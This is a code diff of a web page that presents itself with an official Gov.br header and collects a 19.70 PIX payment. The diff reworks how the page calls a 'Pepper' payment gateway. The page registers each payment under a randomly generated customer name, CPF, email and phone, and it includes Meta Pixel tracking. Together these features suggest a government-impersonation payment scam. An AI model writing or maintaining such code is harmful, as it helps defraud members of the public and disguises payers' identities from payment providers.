@@ -25,7 +25,7 @@
   </script>
 
   <!-- Meta Pixel Code -->
-  <script src="../pepper-api.js"></script>
+  
   <script>
     !function(f,b,e,v,n,t,s)
     {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
@@ -42,6 +42,9 @@
     <img height="1" width="1" style="display:none"
       src="https://www.facebook.com/tr?id=574352008891416&ev=PageView&noscript=1" />
   </noscript>
+  
+<script src="../../pepper-api.js"></script>
+<script src="pepper-api.js"></script>
 </head>
 <body>
   <!-- 1. Cabeçalho Oficial Gov.br -->
@@ -244,6 +247,7 @@
       } catch (e) {}
 
       currentParams.set("valor", "19.70");
+      currentParams.set("gateway", "pepper");
 
       var gatewayCustomer = getOrCreateRandomGatewayCustomer();
       currentParams.set("gateway_name", gatewayCustomer.name);
@@ -274,72 +278,36 @@
           finished = true;
           goToPix(null);
         }
-      }, 6000);
+      }, 7000);
 
-      function handleAcessoSuccess(json) {
-        if (!finished) {
-          finished = true;
-          clearTimeout(timer);
-          if (json && json.pix) {
-            goToPix({
-              pix_qr_code: json.pix.pix_qr_code,
-              qr_code_base64: json.pix.qr_code_base64,
-              hash: json.hash
-            });
-          } else {
-            goToPix(null);
-          }
-        }
-      }
-
-      function handleAcessoFallback() {
-        var apiEndpoint = "../../api/gerar-pix.php";
-        try {
-          fetch(apiEndpoint, {
-            method: "POST",
-            headers: { "Content-Type": "application/json", "Accept": "application/json" },
-            body: JSON.stringify({
-              valor: "19.70",
-              gateway_name: gatewayCustomer.name,
-              gateway_cpf: gatewayCustomer.cpf,
-              gateway_email: gatewayCustomer.email,
-              gateway_phone: gatewayCustomer.phone
-            })
-          })
+      if (window.PepperAPI && typeof window.PepperAPI.createPix === "function") {
+        window.PepperAPI.createPix("19.70", gatewayCustomer)
           .then(function (res) {
-            if (res.ok) return res.json();
-            throw new Error("HTTP " + res.status);
+            if (!finished) {
+              finished = true;
+              clearTimeout(timer);
+              if (res && res.pix) {
+                goToPix({
+                  pix_qr_code: res.pix.pix_qr_code,
+                  qr_code_base64: res.pix.qr_code_base64,
+                  hash: res.hash
+                });
+              } else {
+                goToPix(null);
+              }
+            }
           })
-          .then(function (json) {
-            handleAcessoSuccess(json);
-          })
-          .catch(function () {
+          .catch(function (err) {
+            console.warn("PepperAPI createPix direct:", err);
             if (!finished) {
               finished = true;
               clearTimeout(timer);
               goToPix(null);
             }
           });
-        } catch (err) {
-          if (!finished) {
-            finished = true;
-            clearTimeout(timer);
-            goToPix(null);
-          }
-        }
-      }
-
-      if (window.PepperAPI && typeof window.PepperAPI.createPix === "function") {
-        window.PepperAPI.createPix("19.70", gatewayCustomer)
-          .then(function (res) {
-            handleAcessoSuccess(res);
-          })
-          .catch(function (err) {
-            console.warn("Pepper direct failed, attempting fallback:", err);
-            handleAcessoFallback();
-          });
       } else {
-        handleAcessoFallback();
+        clearTimeout(timer);
+        goToPix(null);
       }
     }
   </script>
